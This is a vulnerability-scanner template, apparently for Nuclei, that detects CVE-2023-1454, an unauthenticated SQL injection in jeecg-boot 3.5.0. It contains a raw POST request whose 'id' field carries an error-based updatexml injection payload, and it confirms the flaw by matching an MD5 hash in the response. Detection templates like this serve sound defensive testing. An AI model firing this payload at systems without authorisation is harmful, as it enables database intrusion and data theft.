id: cve-2023-1454
info:
  name: jeecg-boot unauthorized SQL Injection Vulnerability
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    JeecgBoot is a low-code development platform based on a code generator. This template detects an unauthorized SQL injection vulnerability in jeecg-boot (v3.5.0).
  reference:
    - https://github.com/J0hnWalker/jeecg-boot-sqli
  classification:
    cve-id: CVE-2023-1454
    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8

http:
  - raw:
      - |
        POST /jeecg-boot/jmreport/qurestSql HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"apiSelectId":"1290104038414721025",
         "id":"1' or '%1%' like (updatexml(0x3a,concat(1,(select md5(123456))),1)) or '%%' like '"}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "e10adc3949ba59abbe56e057f20f883e"
        part: body
